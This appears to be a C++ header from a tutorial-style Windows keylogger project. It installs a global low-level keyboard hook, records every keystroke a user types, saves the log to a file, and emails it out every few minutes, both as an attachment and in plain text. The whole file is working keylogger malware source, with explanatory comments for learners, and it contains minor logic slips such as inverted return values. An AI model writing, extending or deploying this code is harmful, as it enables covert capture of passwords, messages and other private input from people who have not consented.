// Recording all the key strokes

#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

/*Where all the key strokes are stored, if the mail is send, this mail will be cleared
,if not we will not clear so we can try to send it in the next mail */
std::string keylog = "";

void TimerSendMail()
{
    // We need to check for this every 2 min interval, so we can see the key strokes stored or not
    if(keylog.empty())
        return;
    /*we will attempt to create an encrypted log in who's name we will place the current time,
    if it succeeds it will return the name of the file otherwise it will return an empty string*/
    std::string last_file = IO::WriteLog(keylog);
    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not succesfull. Keylog '" + keylog + "'");
        return;
    }
    //We are filled body with the recorded key strokes in plain text, this is for only debugging purposes
    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi, \n The file has been attached to this mail.\n For testing:\n" + keylog
                           , IO::GetOurPath(true) + last_file);
    if(x != 7)
        Helper::WriteAppLog("Mail was not send! Error code: " + Helper::ToString(x));
    else // clearing keylog
        keylog = "";

}

Timer MailTimer(TimerSendMail, 1000 * 60, Timer::Infinite);//Mail timer to change

HHOOK eHook = NULL;
//Hooks use for intercepting keyboard or mouse event messages before they reach an application

/*It will be the main function, will be called by the system if the keyboard key is pressed
It can also used to forbid certain keys on the keyboard, nCode(on the net)
*/
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
        //Look on the net for KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *kbs =(KBDLLHOOKSTRUCT *)lparam;
    // Checks if the keys is pressed
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {

        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)//If enter pressed the go into new line
            keylog += '\n';
    }
    /*We are interested in system keys like alt,shift etc, Because we need to know which keys are pressed
    while shift is pressed and which keys pressed while shift is released*/
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_LSHIFT
           || key == VK_RSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
          )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1,"/");
            keylog += KeyName;
        }

    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
    //Once we grab it, we release the hook
}

bool InstallHook()
{
    //Start our timer to send an email and we start it asynchronsly
    Helper::WriteAppLog("Hook started... Timer started");
    MailTimer.Start(true);

    /* WH_KEYBOARD_LL means that we use keyboard hook ll is shorthand for low level indicates that this is a global hook,
    the value of the constant is 13 OurKeyboardProc is a procedure that will be invoked by the hook system every time user
    pressed the key we need it to convert it to hook proc because set windows hook ex function accepts a handle to hook
    procedure.  SetWindowsHookEx -> look in the net
    GetModuleHandle is for obtaining H instance. DW Thread ID
    */

    /*
    the identifier of the thread with which the hook procedure is to be associated
    if this parameter is zero. The hook procedure is associated with all existing threads.
    Basically is alive in the same desktop as the calling thread.We set this parameter to zero,
    which is the last one.
    */
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL ;

}
//Unhook the all keyboard events
bool UninstallHook()
{
    bool b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook ==NULL);
}


#endif // KEYBHOOK_H
